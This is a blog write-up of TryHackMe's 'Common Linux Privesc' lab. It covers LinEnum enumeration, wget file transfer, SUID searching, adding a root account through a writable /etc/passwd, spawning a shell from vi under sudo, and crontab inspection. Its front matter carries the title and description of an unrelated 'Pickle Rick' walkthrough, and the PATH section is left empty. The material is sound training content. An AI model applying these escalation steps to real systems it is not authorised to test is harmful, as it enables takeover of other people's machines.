---
title: TryHackMe - Common Linux Privesc
date: '2021-12-12'
thumb_img_alt: lorem-ipsum
content_img_alt: Icelandic horses
excerpt: Follow along with this "Easy" rated box on TryHackMe to save Pickle Rick.
seo:
  title: Pickle Rick Walkthrough - Easy
  description: Easy To Follow Walkthrough of TryHackMe's Pickle Rick CTF
  extra:
    - name: 'og:type'
      value: article
      keyName: property
    - name: 'og:title'
      value: Pickle Rick CTF Walkthrough - Easy
      keyName: property
    - name: 'og:description'
      value: Easy To Follow Walkthrough of TryHackMe's Pickle Rick CTF
      keyName: property
    - name: 'og:image'
      value: /images/o9pyhyU.jpg
      keyName: property
      relativeUrl: true
    - name: 'twitter:card'
      value: summary_large_image
    - name: 'twitter:title'
      value: Pickle Rick CTF Walkthrough - Easy
    - name: 'twitter:description'
      value: Easy To Follow Walkthrough of TryHackMe's Pickle Rick CTF
    - name: 'twitter:image'
      value: /images/o9pyhyU.jpg
      relativeUrl: true
layout: post
thumb_img_path: /images/icon-b8182a98.png
content_img_path: /images/banner.png
---
TryHackMe - Common Linux Privesc (Privilege Escalation): <https://tryhackme.com/room/commonlinuxprivesc>

This box is listed as Easy .  It provides walk-throughs and practice of common linux privilege escalation vectors.  This will not be a walk-through of the machine, but instead a reiteration of the common privesc vectors taught and practiced in the room.

# | What is Privesc?|

Let's start by discussing what "privesc" is.  Essentially, privesc (privilege escalation) is leveraging access to a low pricilege account to move to a higer privilege account (eg user to root).  Privesc can occur in two directions: horizontal and vertical.  In horizontal privesc, access is gained to an account of the same privilege level. This can be beneficial to access private files or if the new user has SUIDs we can exploit.  In vertical privesc, access is gained to an account with more access to the system (admin / root).  Read through the provided information in each of the three tasks and complete each section.

# | Enumeration |

## LinEnum

LinEnum is a bash script which performs common commands related to privesc.  It can be downloaded from:

<https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh>

Two ways to get LinEnum onto the target machine:

First - start a python webserver from the directory with your copy of LinEnum.sh. (python3 -m http.server 8000).  Then, wget the file from the target machine (wget \[LOCAL_IP]:8000/LinEnum.sh).  After it has been transfered to the target machine, make the file executable (chmod +x LinEnum.sh).

Second - Provided you have the required permissions, copy the raw code and create a .sh file in vi/nano/etc and paste the code.  Make the file executable.

LinEnum can be run as \`./LinEnum.sh\`

![](/images/LinEnum-bf8e2df3.PNG)

LinEnum provides a lot of information.  Take the time to read the provided documentation and understand what gets returned.

# | Abusing SUID/GUID Files |

a SUID is a file (as everything in Linux is) which can be run as the owner regardless of the accessing user (in this case run as root).  These can be leveraged to get a shell and root access.  SUID permissions look like:

\`rws-rwx-rwx\`

whereas GUID permissions look like:

\`rwx-rws-rwx\`

These SUID/GUIDs are reported by LinEnum, but can be searched for manually using:

\`find / -perm -u=s -type f 2>/dev/null\`

\`find - search command

/ - search entire file system

\-perm - find specific permissions

\-u=s - any of the permission bits mode are set for the file

\-type f - only searches for files

2>/dev/null - sends errors to null where they're deleted\`

![](/images/SUID.PNG)

# | Exploiting Writeable /etc/passwd |

#### Understanding /etc/passwd format

USERNAME:PASSWORD\*:USER_ID:GROUP_ID:USER_ID_INFO:HOME_DIRECTORY:COMMAND/SHELL

an x character in the password spot indicates the encrypted password is stored in /etc/shadow

Before adding a new user, a compliant password hash must be created (salt:new using new:123)

![](/images/salted%20hash.PNG)

Next, we can nano the passwd file and add our new user

![](/images/created_new-fc2f2b5d.PNG)

switch user (su) and proof of function

![](/images/new_root.PNG)

# | Escaping Vi Editor |

Once access is gained to a machine sudo -l should be ran to list what commands we can use as super user

Inside vi, :!sh will spawn a shell. :q! will quit.

![](/images/vi-ab2c1ba6.PNG)

# | Exploiting Crontab |

Crontabs can be viewed by \`cat /etc/crontab\`



# | Exploiting PATH Variable |
